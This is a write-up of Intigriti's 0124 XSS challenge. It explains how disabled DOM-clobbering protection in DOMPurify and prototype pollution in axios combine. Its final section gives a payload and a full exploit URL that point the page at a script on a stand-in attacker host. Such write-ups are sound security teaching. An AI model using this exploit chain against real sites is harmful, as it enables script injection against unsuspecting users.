# Intigriti's 0124 XSS Challenge Writeup

> Challenge URL https://challenge-0124.intigriti.io/

> Goal: Find a way to execute arbitrary javascript on the iFramed page and win Intigriti swag.

This is a simple web page that lets to set a username and to search for a repo. If the search is successfull the page will load an image and the repo's website in an iframe. The sources of the challege are provided.

## Source code analysis
### Backend

* The endpoint of interest is '/':

```js
app.get("/", (req, res) => {
    if (!req.query.name) {
        res.render("index");
	return;
    }
    res.render("search", {
        name: DOMPurify.sanitize(req.query.name, { SANITIZE_DOM: false }),
        search: req.query.search
    });
});
```
* The **name** parameter is sanitized with DOMPurify, with the option **SANITIZE_DOM** set to false. Searching on the [documentation](https://github.com/cure53/DOMPurify?tab=readme-ov-file#influence-how-we-sanitize):

```js
// disable DOM Clobbering protection on output (default is true, handle with care, minor XSS risks here)
const clean = DOMPurify.sanitize(dirty, {SANITIZE_DOM: false});
```

* So **SANITIZE_DOM** disables protection against DOM Clobbering.

### Frontend

* The page uses axios to retreive the search results:

```html
<script>
    function search(name) {
        $("img.loading").attr("hidden", false);

        axios.post("/search", $("#search").get(0), {
            "headers": { "Content-Type": "application/json" }
        }).then((d) => {
            $("img.loading").attr("hidden", true);
            const repo = d.data;
            if (!repo.owner) {
                alert("Not found!");
                return;
            };

            $("img.avatar").attr("src", repo.owner.avatar_url);
            $("#description").text(repo.description);
            if (repo.homepage && repo.homepage.startsWith("https://")) {
                $("#homepage").attr({
                    "src": repo.homepage,
                    "hidden": false
                });
            };
        });
    };

    window.onload = () => {
        const params = new URLSearchParams(location.search);
        if (params.get("search")) search();

        $("#search").submit((e) => {
            e.preventDefault();
            search();
        });
    };
</script>
```
* Client-Side prototype pollution in axios `formDataToJSON`

The search form HTML element is passed directly to axios: `$("#search").get(0)`

Axios automatically takes the data to send from an HTML form element, using the `formDataToJSON` function which is vulnerable to prototype pollution according to [this commit](https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e#diff-8aad81cd9123d451e13bbee901b3ac03a001f82b4e95a1d917e44be08cf977a1)

## Exploitation
DOM Clobbering + prototype pollution

* We can set the **name** query param to this:
```html
<form id=search>
	<input name="__proto__.owner" value="x">
	<input name="__proto__.homepage" value="https://attacker.com/xss.js">
</form>
```
* With this payload the **owner** check will be bypassed and the **homepage** property will be polluted, leading to xss
* Exploit url:

`https://challenge-0124.intigriti.io/challenge?name=%3Cform+id%3dsearch%3E%3Cinput+name%3d%22__proto__.owner%22+value%3d%22x%22%3E%3Cinput+name%3d%22__proto__.homepage%22+value%3d%22https%3a//attacker.com/xss.js%22%3E%3C/form%3E&search=c`